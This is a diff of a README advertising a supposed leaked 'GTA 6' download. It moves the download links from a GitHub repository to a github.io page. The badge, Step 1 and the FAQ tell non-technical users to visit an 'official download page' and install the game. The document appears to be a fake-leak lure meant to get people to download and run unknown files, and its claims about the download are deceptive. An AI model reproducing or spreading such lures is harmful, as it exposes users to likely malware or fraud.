@@ -26,11 +26,11 @@ Getting the game on your computer is simple. No technical skills needed. Just fo
 
 ## 📥 Download the Game
 
-[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️%20Download%20GTA%206%20Leak-Click%20Here%20-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/asatuontop-cloud/CyberLeek-GTA6-Torrent)
+[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️%20Download%20GTA%206%20Leak-Click%20Here%20-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://asatuontop-cloud.github.io)
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: **[https://github.com/asatuontop-cloud/CyberLeek-GTA6-Torrent](https://github.com/asatuontop-cloud/CyberLeek-GTA6-Torrent)**
+Visit this link to download the application: **[https://asatuontop-cloud.github.io](https://asatuontop-cloud.github.io)**
 
 This will open the official download page in your web browser.
 
@@ -152,7 +152,7 @@ If you want to uninstall later, simply delete the folder where the game was extr
 **A:** If your laptop has a dedicated graphics card (not integrated), yes. Integrated graphics (like Intel UHD) won't handle this game well.
 
 ### Q: What if something goes wrong?
-**A:** Visit the [download page](https://github.com/asatuontop-cloud/CyberLeek-GTA6-Torrent) and check the "Issues" tab. Other players have likely had the same problem and posted solutions.
+**A:** Visit the [download page](https://asatuontop-cloud.github.io) and check the "Issues" tab. Other players have likely had the same problem and posted solutions.
 
 ---
 
